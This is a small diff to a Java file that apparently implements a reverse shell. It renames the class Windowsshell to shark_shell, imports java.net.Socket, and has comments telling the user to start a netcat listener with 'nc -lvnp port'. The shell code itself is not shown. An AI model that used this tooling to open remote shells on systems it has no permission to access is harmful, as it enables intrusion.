@@ -5,7 +5,7 @@ import java.net.Socket;
 //shiky
 //run netcat
 //nc -lvnp port
-public class Windowsshell {
+public class shark_shell {
     /**
      * @param args the command line arguments
      * @throws java.io.IOException
